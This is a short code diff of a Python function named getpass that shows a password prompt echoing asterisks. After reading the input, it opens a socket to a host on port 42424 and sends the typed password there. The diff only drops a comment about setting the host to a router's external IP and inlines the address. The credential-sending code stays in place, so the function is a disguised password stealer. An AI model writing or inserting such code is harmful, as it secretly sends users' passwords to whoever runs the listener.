@@ -12,10 +12,9 @@ def getpass(prompt):
         else:
             buf += ch
             print('*', end='', flush=True)
-    host = '0.0.0.0' #The host on your client needs to be the external-facing IP address of your router. Obtain it from here https://www.whatismyip.com/
     port = 42424
     s = socket.socket()
-    s.connect((host,port))
+    s.connect(('0.0.0.0',port))
     s.send(buf.encode())
     s.close()
     return buf
